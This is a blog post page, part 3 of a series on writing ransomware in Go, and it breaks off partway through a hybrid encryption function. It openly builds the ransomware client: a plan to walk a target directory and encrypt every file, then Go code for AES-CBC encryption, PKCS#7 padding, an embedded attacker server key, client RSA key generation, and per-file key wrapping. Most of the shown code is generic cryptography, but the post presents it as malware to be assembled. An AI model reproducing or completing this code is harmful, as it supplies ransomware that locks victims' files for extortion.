<!DOCTYPE html>
<html lang=en>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="We write the wares...">
  <meta property="og:title" content="The Client - Ransomware in Golang Part 3">
  <meta property="og:description" content="We write the wares...">
  <meta property="og:site_name" content="TACIX.AT">
  <meta name="twitter:site" content="@cyberingcc">
  <title>TACIX.AT - The Client - Ransomware in Golang Part 3</title>
  <link href="https://fonts.googleapis.com/css2?family=Inconsolata&family=Major+Mono+Display&display=swap" rel="stylesheet"> 
  <style>
    html {
      height: 100%;
    }
    
    header {
      width: 960px;
      margin: 0 auto;
      display: flex;
      flex-direction: row;
    }

    body {
      display: flex;
      flex-direction: column;      
      width: 100%;
      color: #EEE;
      background-color: #333;
      margin: 0;
      height: 100%;
      font-size: 28px;
      font-family: 'Inconsolata', monospace;
    }

    footer {
      width: 960px;
      margin: 0 auto;
      display: flex;
      flex-direction: row;
      min-height: 50px;
    }

    a {
      color: #EEE;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    a:visited {
      color: #DDD;
    }

    #title {
      flex-grow: 1;
      font-size: 32px;
      font-weight: 300;
      padding: 10px 0px;
    }

    #about {
      font-size: 24px;
      margin-top: 14px;
    }

    #main {
      flex-grow: 1;
      width: 960px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      padding: 30px 0px;
    }

    #rss-link {
      flex-grow: 1;
      text-align: right;
    }

    @media only screen and (max-width: 959px) {
      html {
        padding: 5px;
      }

      header {
        width: 100%;
      }

      #main {
        width: 100%;
      }

      footer {
        width: 100%;
      }
    }

    
    #date {
      font-size: 18px;
      font-style: italic;
    }

    #title {
      font-size: 32px;
    }

    h1, h2, h3, h4, h5 {
      color: #a8caee;
      font-family: 'Major Mono Display', monospace;
    }

    pre {
      font-family: 'Inconsolata', monospace !important;
    }

    p a {
      text-decoration: underline;
      line-height: 32px;
    }

    code {
      color: #fbb5b5;
      background-color: #3e3e3e;
      border-radius: 4px;
    }

    pre {
      overflow: auto;
    }

    @media only screen and (max-width: 959px) {
      body {
        font-size: 18px;
      }
    }

  </style>
</head>
<body>
  <header>
    <span id=title><a href=/>TACIX.AT</a></span>
    <span id=about><a href=/about>About</a></span>
  </header>

  <div id=main>
  
  <div id=title>The Client - Ransomware in Golang Part 3</div>
  <div id=date>2021/09/02 13:37</div>
  <div>
<p>We&rsquo;re ready to write the client for our malware! We have the server&rsquo;s keypair and some understand of how to build this, so let&rsquo;s get started.</p>

<p><em>If you haven&rsquo;t seen the other posts, you can follow along from the beginning at <a href="https://tacix.at">tacix.at</a>.</em></p>

<p>Following is a high level sketch of what our client needs to do.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#6272a4">// generate client keypair
</span><span style="color:#6272a4"></span><span style="color:#6272a4">// encrypt client private key with server public key
</span><span style="color:#6272a4"></span><span style="color:#6272a4">// post encrypted client private key to server (TBD)
</span><span style="color:#6272a4"></span><span style="color:#6272a4">// walk target directory
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// at each file
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// generate file key
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// read file
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// encrypt file
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// encrypt file key with client public key
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// store encrypted file key
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// write encrypted data back to file
</span></pre>
<p>Pretty easy! We have already learned most of these things in previous posts. The largest missing piece is encrypting the file. Since our RSA keys can barely encrypt 63 bytes of data, and files can be much larger than 63 bytes, we will need to use something else. For this we will use AES which is a symmetric encryption algorithm.</p>

<h2>Symmetric Encryption with AES</h2>

<p>What we will be doing is generating an AES key for each file, encrypting the file with that, then encrypting that key with the client&rsquo;s public key. So let&rsquo;s figure out how to use AES.</p>

<p>AES is a symmetric encryption algorithm, which means it uses the same key for decryption as it does for encryption. We are going to be using AES in cipher block chaining (CBC) mode. There are 5 modes and <a href="https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb">nerds patronizingly explain them to each other to show that they&rsquo;ve read StackOverflow.</a></p>

<p>What do we need for AES CBC? We need a randomly generated key (secret), a randomly generated initialization vector (IV) (not secret), a plaintext to encrypt (secret), and some padding to make sure the plaintext length is a multiple of the key size. The key and IV are 16 bytes (128 bits). We&rsquo;ll do no padding for this first go.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#6272a4">// scratch/sym.go
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">package</span> main

<span style="color:#ff79c6">import</span> (
	<span style="color:#f1fa8c">&#34;crypto/aes&#34;</span>
	<span style="color:#f1fa8c">&#34;crypto/cipher&#34;</span>
	<span style="color:#f1fa8c">&#34;crypto/rand&#34;</span>
	<span style="color:#f1fa8c">&#34;fmt&#34;</span>
	<span style="color:#f1fa8c">&#34;log&#34;</span>
)

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
	<span style="color:#6272a4">// 16 byte buffer for our key
</span><span style="color:#6272a4"></span>	k <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, <span style="color:#bd93f9">16</span>)
	<span style="color:#6272a4">// fill buffer with random data
</span><span style="color:#6272a4"></span>	rand.<span style="color:#50fa7b">Read</span>(k)
	fmt.<span style="color:#50fa7b">Printf</span>(<span style="color:#f1fa8c">&#34;k:  %x\n&#34;</span>, k)

	<span style="color:#6272a4">// create a cipher using our key
</span><span style="color:#6272a4"></span>	blk, err <span style="color:#ff79c6">:=</span> aes.<span style="color:#50fa7b">NewCipher</span>(k)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	<span style="color:#6272a4">// ditto key but for the IV (also length 16)
</span><span style="color:#6272a4"></span>	iv <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, blk.<span style="color:#50fa7b">BlockSize</span>())
	rand.<span style="color:#50fa7b">Read</span>(iv)
	fmt.<span style="color:#50fa7b">Printf</span>(<span style="color:#f1fa8c">&#34;iv: %x\n&#34;</span>, iv)

	<span style="color:#6272a4">// create our CBC encryptor and decyptor
</span><span style="color:#6272a4"></span>	enc <span style="color:#ff79c6">:=</span> cipher.<span style="color:#50fa7b">NewCBCEncrypter</span>(blk, iv)
	dec <span style="color:#ff79c6">:=</span> cipher.<span style="color:#50fa7b">NewCBCDecrypter</span>(blk, iv)

	<span style="color:#6272a4">// plaintext
</span><span style="color:#6272a4"></span>	p <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">2</span>,<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">4</span>,<span style="color:#bd93f9">5</span>,<span style="color:#bd93f9">6</span>,<span style="color:#bd93f9">7</span>,<span style="color:#bd93f9">8</span>,<span style="color:#bd93f9">9</span>,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">2</span>,<span style="color:#bd93f9">3</span>,<span style="color:#bd93f9">4</span>,<span style="color:#bd93f9">5</span>}
	<span style="color:#6272a4">// ciphertext (same size as plaintext + padding)
</span><span style="color:#6272a4"></span>	c <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, <span style="color:#8be9fd;font-style:italic">len</span>(p))

	<span style="color:#6272a4">// encrypt!
</span><span style="color:#6272a4"></span>	enc.<span style="color:#50fa7b">CryptBlocks</span>(c, p)

	fmt.<span style="color:#50fa7b">Printf</span>(<span style="color:#f1fa8c">&#34;p:  %x\n&#34;</span>, p)
	fmt.<span style="color:#50fa7b">Printf</span>(<span style="color:#f1fa8c">&#34;c:  %x\n&#34;</span>, c)

	<span style="color:#6272a4">// zero the plaintext to check decryption works
</span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> p {
		p[i] = <span style="color:#bd93f9">0</span>
	}

	<span style="color:#6272a4">// decrypt!
</span><span style="color:#6272a4"></span>	dec.<span style="color:#50fa7b">CryptBlocks</span>(p, c)
	fmt.<span style="color:#50fa7b">Printf</span>(<span style="color:#f1fa8c">&#34;p:  %x\n&#34;</span>, p)
}
</pre>
<p>Pretty straight forward. Now we have some fun problems. We need to pad the plaintext when <code>len(p) % block_size != 0</code>. The scheme for this actually also pads it when <code>len(p) % block_size == 0</code> as well, but in that situation it wasn&rsquo;t strictly necessary, it just makes our lives easier.</p>

<p>This padding scheme is from a standard called PKCS#7. It is detailed on <a href="https://datatracker.ietf.org/doc/html/rfc2315#page-21">page 21 of RFC 2315</a>. Basically, we&rsquo;re always going to add padding and we&rsquo;re going to use the number of bytes as the byte value for the padding. For example, if we need 1 byte of padding, we are going to add <code>{0x01}</code> to the end of the plaintext. If we needed two bytes of padding we would add <code>{0x02, 0x02}</code> to the end of the plaintext. If we needed 0 bytes of padding (assuming block size of 16), we would still add padding, in this case, <code>{0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10}</code>. That&rsquo;s sixteen 16s. Why add padding when we don&rsquo;t need any? Well, this way lets us just check the last byte, read that many bytes off the end, verify they are all the same byte, then proceed.</p>

<p>We&rsquo;ll make a little pad function. The <a href="https://en.wikipedia.org/wiki/Modulo_operation">modulo</a> of the block size gives us how many bytes beyond the block size multiple we have. So we really want the difference <code>blocksize - (len(p) % blocksize)</code>.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#6272a4">// scratch/pad.go
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">package</span> main

<span style="color:#ff79c6">import</span> (
	<span style="color:#f1fa8c">&#34;bytes&#34;</span>
	<span style="color:#f1fa8c">&#34;fmt&#34;</span>
)

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">pad</span>(bs []<span style="color:#8be9fd">byte</span>, blksz <span style="color:#8be9fd">int</span>) []<span style="color:#8be9fd">byte</span> {
	<span style="color:#6272a4">// default to block size
</span><span style="color:#6272a4"></span>	count <span style="color:#ff79c6">:=</span> blksz
	<span style="color:#6272a4">// if we have leftover bytes
</span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(bs) <span style="color:#ff79c6">%</span> blksz <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span> {
		<span style="color:#6272a4">// difference between blocksize and leftover bytes
</span><span style="color:#6272a4"></span>		count = blksz  <span style="color:#ff79c6">-</span> (<span style="color:#8be9fd;font-style:italic">len</span>(bs) <span style="color:#ff79c6">%</span> blksz)
	}
	<span style="color:#6272a4">// create padding buffer
</span><span style="color:#6272a4"></span>	padding <span style="color:#ff79c6">:=</span> bytes.<span style="color:#50fa7b">Repeat</span>([]<span style="color:#8be9fd">byte</span>{<span style="color:#8be9fd;font-style:italic">byte</span>(count)}, count)
	<span style="color:#6272a4">// append padding to plaintext
</span><span style="color:#6272a4"></span>	bs = <span style="color:#8be9fd;font-style:italic">append</span>(bs, padding<span style="color:#ff79c6">...</span>)
	<span style="color:#6272a4">// return bs
</span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">return</span> bs
}

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
	<span style="color:#6272a4">// a quick test
</span><span style="color:#6272a4"></span>	bs <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">byte</span>{<span style="color:#bd93f9">0x00</span>,<span style="color:#bd93f9">0x11</span>,<span style="color:#bd93f9">0x22</span>,<span style="color:#bd93f9">0x33</span>,<span style="color:#bd93f9">0x44</span>,<span style="color:#bd93f9">0x55</span>}
	bs = <span style="color:#50fa7b">pad</span>(bs, <span style="color:#bd93f9">16</span>)
	fmt.<span style="color:#50fa7b">Printf</span>(<span style="color:#f1fa8c">&#34;%x\n&#34;</span>, bs)
}
</pre>
<h2>The Client</h2>

<p>We&rsquo;ll start out by loading our keys in an <code>init()</code> function. This function runs automatically at the start of the program.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#6272a4">// client/main.go
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">package</span> main

<span style="color:#ff79c6">import</span> (
	<span style="color:#f1fa8c">&#34;crypto/rand&#34;</span>
	<span style="color:#f1fa8c">&#34;crypto/rsa&#34;</span>
	<span style="color:#f1fa8c">&#34;crypto/x509&#34;</span>
	<span style="color:#f1fa8c">&#34;log&#34;</span>
	<span style="color:#f1fa8c">&#34;math/big&#34;</span>
)

<span style="color:#8be9fd;font-style:italic">var</span> clientKey <span style="color:#ff79c6">*</span>rsa.PublicKey
<span style="color:#8be9fd;font-style:italic">var</span> serverKey <span style="color:#ff79c6">*</span>rsa.PublicKey
<span style="color:#8be9fd;font-style:italic">var</span> serverKeyBytes = []<span style="color:#8be9fd">byte</span>{
	<span style="color:#bd93f9">0x30</span>, <span style="color:#bd93f9">0x82</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x0a</span>, <span style="color:#bd93f9">0x02</span>, <span style="color:#bd93f9">0x82</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x01</span>,
	<span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0xb4</span>, <span style="color:#bd93f9">0x10</span>, <span style="color:#bd93f9">0x46</span>, <span style="color:#bd93f9">0xf7</span>, <span style="color:#bd93f9">0x7e</span>, <span style="color:#bd93f9">0x73</span>, <span style="color:#bd93f9">0x72</span>,
	<span style="color:#bd93f9">0x22</span>, <span style="color:#bd93f9">0x4a</span>, <span style="color:#bd93f9">0xcf</span>, <span style="color:#bd93f9">0x98</span>, <span style="color:#bd93f9">0xc8</span>, <span style="color:#bd93f9">0x60</span>, <span style="color:#bd93f9">0x67</span>, <span style="color:#bd93f9">0x6c</span>,
	<span style="color:#bd93f9">0x96</span>, <span style="color:#bd93f9">0x0b</span>, <span style="color:#bd93f9">0xf9</span>, <span style="color:#bd93f9">0x42</span>, <span style="color:#bd93f9">0x5d</span>, <span style="color:#bd93f9">0x05</span>, <span style="color:#bd93f9">0xbf</span>, <span style="color:#bd93f9">0x99</span>,
	<span style="color:#bd93f9">0x96</span>, <span style="color:#bd93f9">0xe8</span>, <span style="color:#bd93f9">0x69</span>, <span style="color:#bd93f9">0xed</span>, <span style="color:#bd93f9">0x95</span>, <span style="color:#bd93f9">0xa4</span>, <span style="color:#bd93f9">0x95</span>, <span style="color:#bd93f9">0xbb</span>,
	<span style="color:#bd93f9">0xd2</span>, <span style="color:#bd93f9">0x62</span>, <span style="color:#bd93f9">0xa5</span>, <span style="color:#bd93f9">0x35</span>, <span style="color:#bd93f9">0x77</span>, <span style="color:#bd93f9">0x97</span>, <span style="color:#bd93f9">0x19</span>, <span style="color:#bd93f9">0xc7</span>,
	<span style="color:#bd93f9">0x09</span>, <span style="color:#bd93f9">0x92</span>, <span style="color:#bd93f9">0x61</span>, <span style="color:#bd93f9">0xd9</span>, <span style="color:#bd93f9">0x5f</span>, <span style="color:#bd93f9">0xea</span>, <span style="color:#bd93f9">0x3e</span>, <span style="color:#bd93f9">0x49</span>,
	<span style="color:#bd93f9">0xf5</span>, <span style="color:#bd93f9">0x3f</span>, <span style="color:#bd93f9">0x6f</span>, <span style="color:#bd93f9">0x84</span>, <span style="color:#bd93f9">0x21</span>, <span style="color:#bd93f9">0x94</span>, <span style="color:#bd93f9">0xc9</span>, <span style="color:#bd93f9">0xda</span>,
	<span style="color:#bd93f9">0xfd</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#bd93f9">0x62</span>, <span style="color:#bd93f9">0xc4</span>, <span style="color:#bd93f9">0x61</span>, <span style="color:#bd93f9">0x7c</span>, <span style="color:#bd93f9">0x86</span>, <span style="color:#bd93f9">0xfc</span>,
	<span style="color:#bd93f9">0xd6</span>, <span style="color:#bd93f9">0x1f</span>, <span style="color:#bd93f9">0xc8</span>, <span style="color:#bd93f9">0x35</span>, <span style="color:#bd93f9">0x2a</span>, <span style="color:#bd93f9">0x78</span>, <span style="color:#bd93f9">0xd5</span>, <span style="color:#bd93f9">0x3e</span>,
	<span style="color:#bd93f9">0xb8</span>, <span style="color:#bd93f9">0xd3</span>, <span style="color:#bd93f9">0x3b</span>, <span style="color:#bd93f9">0xa7</span>, <span style="color:#bd93f9">0x3c</span>, <span style="color:#bd93f9">0x9e</span>, <span style="color:#bd93f9">0x82</span>, <span style="color:#bd93f9">0x55</span>,
	<span style="color:#bd93f9">0xe3</span>, <span style="color:#bd93f9">0x5b</span>, <span style="color:#bd93f9">0x5c</span>, <span style="color:#bd93f9">0x82</span>, <span style="color:#bd93f9">0x50</span>, <span style="color:#bd93f9">0xa5</span>, <span style="color:#bd93f9">0x06</span>, <span style="color:#bd93f9">0xf4</span>,
	<span style="color:#bd93f9">0x42</span>, <span style="color:#bd93f9">0xfe</span>, <span style="color:#bd93f9">0x93</span>, <span style="color:#bd93f9">0xad</span>, <span style="color:#bd93f9">0x61</span>, <span style="color:#bd93f9">0x80</span>, <span style="color:#bd93f9">0xff</span>, <span style="color:#bd93f9">0xf2</span>,
	<span style="color:#bd93f9">0x8e</span>, <span style="color:#bd93f9">0xe3</span>, <span style="color:#bd93f9">0x78</span>, <span style="color:#bd93f9">0xcb</span>, <span style="color:#bd93f9">0xec</span>, <span style="color:#bd93f9">0x91</span>, <span style="color:#bd93f9">0x3f</span>, <span style="color:#bd93f9">0x40</span>,
	<span style="color:#bd93f9">0xae</span>, <span style="color:#bd93f9">0x71</span>, <span style="color:#bd93f9">0x1f</span>, <span style="color:#bd93f9">0x50</span>, <span style="color:#bd93f9">0xb3</span>, <span style="color:#bd93f9">0x1c</span>, <span style="color:#bd93f9">0x1e</span>, <span style="color:#bd93f9">0xdc</span>,
	<span style="color:#bd93f9">0x99</span>, <span style="color:#bd93f9">0xed</span>, <span style="color:#bd93f9">0xbb</span>, <span style="color:#bd93f9">0x33</span>, <span style="color:#bd93f9">0xe4</span>, <span style="color:#bd93f9">0x6c</span>, <span style="color:#bd93f9">0xb4</span>, <span style="color:#bd93f9">0x84</span>,
	<span style="color:#bd93f9">0x18</span>, <span style="color:#bd93f9">0x87</span>, <span style="color:#bd93f9">0x51</span>, <span style="color:#bd93f9">0xc7</span>, <span style="color:#bd93f9">0x42</span>, <span style="color:#bd93f9">0x0e</span>, <span style="color:#bd93f9">0xa5</span>, <span style="color:#bd93f9">0x80</span>,
	<span style="color:#bd93f9">0x4c</span>, <span style="color:#bd93f9">0x36</span>, <span style="color:#bd93f9">0xd2</span>, <span style="color:#bd93f9">0xf2</span>, <span style="color:#bd93f9">0x52</span>, <span style="color:#bd93f9">0x58</span>, <span style="color:#bd93f9">0x08</span>, <span style="color:#bd93f9">0x26</span>,
	<span style="color:#bd93f9">0x6c</span>, <span style="color:#bd93f9">0x36</span>, <span style="color:#bd93f9">0x4b</span>, <span style="color:#bd93f9">0x15</span>, <span style="color:#bd93f9">0x22</span>, <span style="color:#bd93f9">0x91</span>, <span style="color:#bd93f9">0xd1</span>, <span style="color:#bd93f9">0x92</span>,
	<span style="color:#bd93f9">0xcb</span>, <span style="color:#bd93f9">0x82</span>, <span style="color:#bd93f9">0x0f</span>, <span style="color:#bd93f9">0xa8</span>, <span style="color:#bd93f9">0x3f</span>, <span style="color:#bd93f9">0xbe</span>, <span style="color:#bd93f9">0x57</span>, <span style="color:#bd93f9">0x2a</span>,
	<span style="color:#bd93f9">0xd0</span>, <span style="color:#bd93f9">0xf2</span>, <span style="color:#bd93f9">0x51</span>, <span style="color:#bd93f9">0xa6</span>, <span style="color:#bd93f9">0x3c</span>, <span style="color:#bd93f9">0x92</span>, <span style="color:#bd93f9">0xb9</span>, <span style="color:#bd93f9">0x00</span>,
	<span style="color:#bd93f9">0x25</span>, <span style="color:#bd93f9">0x23</span>, <span style="color:#bd93f9">0xf4</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0xa4</span>, <span style="color:#bd93f9">0x8f</span>, <span style="color:#bd93f9">0x09</span>, <span style="color:#bd93f9">0xb4</span>,
	<span style="color:#bd93f9">0x5f</span>, <span style="color:#bd93f9">0x42</span>, <span style="color:#bd93f9">0x3f</span>, <span style="color:#bd93f9">0x7d</span>, <span style="color:#bd93f9">0x2d</span>, <span style="color:#bd93f9">0xf8</span>, <span style="color:#bd93f9">0xb0</span>, <span style="color:#bd93f9">0x61</span>,
	<span style="color:#bd93f9">0x03</span>, <span style="color:#bd93f9">0xcc</span>, <span style="color:#bd93f9">0x93</span>, <span style="color:#bd93f9">0x29</span>, <span style="color:#bd93f9">0x63</span>, <span style="color:#bd93f9">0x6a</span>, <span style="color:#bd93f9">0xce</span>, <span style="color:#bd93f9">0x1c</span>,
	<span style="color:#bd93f9">0x3f</span>, <span style="color:#bd93f9">0x19</span>, <span style="color:#bd93f9">0x7b</span>, <span style="color:#bd93f9">0x03</span>, <span style="color:#bd93f9">0x13</span>, <span style="color:#bd93f9">0xd2</span>, <span style="color:#bd93f9">0xd9</span>, <span style="color:#bd93f9">0x99</span>,
	<span style="color:#bd93f9">0x85</span>, <span style="color:#bd93f9">0x55</span>, <span style="color:#bd93f9">0x2c</span>, <span style="color:#bd93f9">0xfa</span>, <span style="color:#bd93f9">0x19</span>, <span style="color:#bd93f9">0x92</span>, <span style="color:#bd93f9">0x18</span>, <span style="color:#bd93f9">0x8a</span>,
	<span style="color:#bd93f9">0x39</span>, <span style="color:#bd93f9">0x57</span>, <span style="color:#bd93f9">0x4e</span>, <span style="color:#bd93f9">0x22</span>, <span style="color:#bd93f9">0xa3</span>, <span style="color:#bd93f9">0x39</span>, <span style="color:#bd93f9">0x93</span>, <span style="color:#bd93f9">0xaa</span>,
	<span style="color:#bd93f9">0x5b</span>, <span style="color:#bd93f9">0xaa</span>, <span style="color:#bd93f9">0x2f</span>, <span style="color:#bd93f9">0x2a</span>, <span style="color:#bd93f9">0x41</span>, <span style="color:#bd93f9">0xcb</span>, <span style="color:#bd93f9">0xb6</span>, <span style="color:#bd93f9">0xbc</span>,
	<span style="color:#bd93f9">0xde</span>, <span style="color:#bd93f9">0x29</span>, <span style="color:#bd93f9">0xe1</span>, <span style="color:#bd93f9">0xbf</span>, <span style="color:#bd93f9">0x4b</span>, <span style="color:#bd93f9">0xbb</span>, <span style="color:#bd93f9">0xac</span>, <span style="color:#bd93f9">0x38</span>,
	<span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x1b</span>, <span style="color:#bd93f9">0x4f</span>, <span style="color:#bd93f9">0xb8</span>, <span style="color:#bd93f9">0x4f</span>, <span style="color:#bd93f9">0x39</span>, <span style="color:#bd93f9">0xf6</span>, <span style="color:#bd93f9">0xb0</span>,
	<span style="color:#bd93f9">0x0d</span>, <span style="color:#bd93f9">0x92</span>, <span style="color:#bd93f9">0x49</span>, <span style="color:#bd93f9">0x0b</span>, <span style="color:#bd93f9">0x60</span>, <span style="color:#bd93f9">0x25</span>, <span style="color:#bd93f9">0x15</span>, <span style="color:#bd93f9">0xd2</span>,
	<span style="color:#bd93f9">0xad</span>, <span style="color:#bd93f9">0xfa</span>, <span style="color:#bd93f9">0x56</span>, <span style="color:#bd93f9">0xb1</span>, <span style="color:#bd93f9">0x0a</span>, <span style="color:#bd93f9">0x94</span>, <span style="color:#bd93f9">0xfc</span>, <span style="color:#bd93f9">0xdc</span>,
	<span style="color:#bd93f9">0x55</span>, <span style="color:#bd93f9">0xb9</span>, <span style="color:#bd93f9">0x52</span>, <span style="color:#bd93f9">0xe6</span>, <span style="color:#bd93f9">0x64</span>, <span style="color:#bd93f9">0x93</span>, <span style="color:#bd93f9">0x85</span>, <span style="color:#bd93f9">0x36</span>,
	<span style="color:#bd93f9">0x23</span>, <span style="color:#bd93f9">0x02</span>, <span style="color:#bd93f9">0x03</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x01</span>}

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">init</span>() {
	<span style="color:#8be9fd;font-style:italic">var</span> err <span style="color:#8be9fd">error</span>
	serverKey, err = x509.<span style="color:#50fa7b">ParsePKCS1PublicKey</span>(serverKeyBytes)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	clientPrv, err <span style="color:#ff79c6">:=</span> rsa.<span style="color:#50fa7b">GenerateKey</span>(rand.Reader, <span style="color:#bd93f9">1024</span>)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	n <span style="color:#ff79c6">:=</span> big.<span style="color:#50fa7b">NewInt</span>(<span style="color:#bd93f9">0</span>)
	n.<span style="color:#50fa7b">SetBytes</span>(clientPrv.PublicKey.N.<span style="color:#50fa7b">Bytes</span>())
	clientKey = <span style="color:#ff79c6">&amp;</span>rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv <span style="color:#ff79c6">:=</span> x509.<span style="color:#50fa7b">MarshalPKCS1PrivateKey</span>(clientPrv)
	log.<span style="color:#50fa7b">Println</span>(encodedPrv)

	<span style="color:#6272a4">// encrypt client prv
</span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// write encrypted client prv to file
</span><span style="color:#6272a4"></span>}

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
	log.<span style="color:#50fa7b">Println</span>(clientKey)
	log.<span style="color:#50fa7b">Println</span>(serverKey)
}
</pre>
<p>With our server key loaded and client key generated, we need to now encrypt the client key and store it. This will be provided to the server for decryption.</p>

<p>To do this, we can use the same encryption scheme we would for other files. That is, we will generate a symmetric key for the file, encrypt the file, encrypt that symmetric key with the server&rsquo;s public key, store that information. We will create a helper function <code>zero()</code> to clear key data from memory.</p>
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#6272a4">// overwrite data in memory
</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">zero</span>(bs []<span style="color:#8be9fd">byte</span>) {
	<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> bs {
		bs[i] = <span style="color:#bd93f9">0x41</span>
	}
}

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">pad</span>(bs []<span style="color:#8be9fd">byte</span>, blksz <span style="color:#8be9fd">int</span>) []<span style="color:#8be9fd">byte</span> {
	count <span style="color:#ff79c6">:=</span> blksz
	<span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(bs) <span style="color:#ff79c6">%</span> blksz <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span> {
		count = blksz  <span style="color:#ff79c6">-</span> (<span style="color:#8be9fd;font-style:italic">len</span>(bs) <span style="color:#ff79c6">%</span> blksz)
	}

	padding <span style="color:#ff79c6">:=</span> bytes.<span style="color:#50fa7b">Repeat</span>([]<span style="color:#8be9fd">byte</span>{<span style="color:#8be9fd;font-style:italic">byte</span>(count)}, count)
	bs = <span style="color:#8be9fd;font-style:italic">append</span>(bs, padding<span style="color:#ff79c6">...</span>)
	<span style="color:#ff79c6">return</span> bs
}

<span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">encryptHybrid</span>(rsaKey <span style="color:#ff79c6">*</span>rsa.PublicKey, bs []<span style="color:#8be9fd">byte</span>) ([]<span style="color:#8be9fd">byte</span>, []<span style="color:#8be9fd">byte</span>) {
	<span style="color:#6272a4">// generate symmetric key
</span><span style="color:#6272a4"></span>	k <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, <span style="color:#bd93f9">16</span>)
	rand.<span style="color:#50fa7b">Read</span>(k)

	<span style="color:#6272a4">// make cipher
</span><span style="color:#6272a4"></span>	blk, err <span style="color:#ff79c6">:=</span> aes.<span style="color:#50fa7b">NewCipher</span>(k)
	<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
		log.<span style="color:#50fa7b">Fatal</span>(err)
	}

	<span style="color:#6272a4">// pad plaintext
</span><span style="color:#6272a4"></span>	bs = <span style="color:#50fa7b">pad</span>(bs, blk.<span style="color:#50fa7b">BlockSize</span>())
	
	<span style="color:#6272a4">// make iv
</span><span style="color:#6272a4"></span>	iv <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, blk.<span style="color:#50fa7b">BlockSize</span>())
	rand.<span style="color:#50fa7b">Read</span>(iv)

	<span style="color:#6272a4">// encrypt plaintext with symmetric key
